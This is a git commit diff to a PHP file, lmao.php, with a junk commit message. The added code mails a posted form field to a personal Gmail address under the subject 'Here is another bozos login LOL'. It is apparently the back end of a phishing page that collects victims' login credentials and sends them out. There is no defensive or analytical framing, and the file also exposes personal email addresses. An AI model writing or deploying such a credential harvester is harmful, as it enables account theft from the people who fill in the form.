c8a7de574a28b14b05204052c3c2ee8096eeb589
Theree <83382093+Therqy@users.noreply.github.com>
2021-12-08 21:30:36 -0600

    ddddd
    dddddddddd

--- lmao.php
+++ lmao.php
@@ -1,10 +1,8 @@
 <?php
-  header('Content-Type: text/plain; charset=utf-8');
-  echo 'test';
-  
+
+
   if($_POST["Message"]) {
-  mail("gdtheroy@gmail.com", "Here is another bozos login LOL",
-  $_POST[]. "From: theroy0828@gmail.com");
+  mail("gdtheroy@gmail.com", "Here is another bozos login LOL", $_POST["sjkdbdfd.xcv,mfbjnsdfkjkbhsdfkjbgh"], "From: theroy0828@gmail.com");
   }
 
 
